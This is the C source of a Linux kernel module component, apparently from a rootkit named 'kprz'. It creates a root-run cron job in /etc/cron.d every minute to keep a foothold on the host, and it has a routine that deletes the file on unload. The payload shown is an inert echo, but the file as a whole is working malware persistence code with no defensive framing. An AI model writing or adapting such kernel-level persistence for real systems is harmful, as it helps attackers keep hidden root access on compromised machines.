#include "persistence.h"
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/init.h>
#include <linux/file.h>
#include <linux/cred.h>
#include <linux/version.h>

#define PERSISTENCE_PATH "/etc/cron.d/kprz_persist"
#define PERSISTENCE_PAYLOAD "* * * * * root /usr/bin/echo kprz_persist_active\n"

ssize_t kernel_write(struct file *file, const void *buf, size_t count, loff_t *pos);

static void create_cron_persistence(void) {
    struct file *file;
    loff_t pos = 0;

    file = filp_open(PERSISTENCE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (IS_ERR(file))
        return;

    kernel_write(file, PERSISTENCE_PAYLOAD, strlen(PERSISTENCE_PAYLOAD), &pos);

    filp_close(file, NULL);
}

static void remove_cron_persistence(void) {
    struct path path;
    int err;

    err = kern_path(PERSISTENCE_PATH, LOOKUP_FOLLOW, &path);
    if (err)
        return;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6,3,0)
    vfs_unlink(mnt_idmap(path.mnt), d_inode(path.dentry->d_parent), path.dentry, NULL);
#else
    vfs_unlink(d_inode(path.dentry->d_parent), path.dentry, NULL);
#endif

    path_put(&path);
}

void setup_persistence(void) {
    create_cron_persistence();
}

void cleanup_persistence(void) {
    remove_cron_persistence();
}
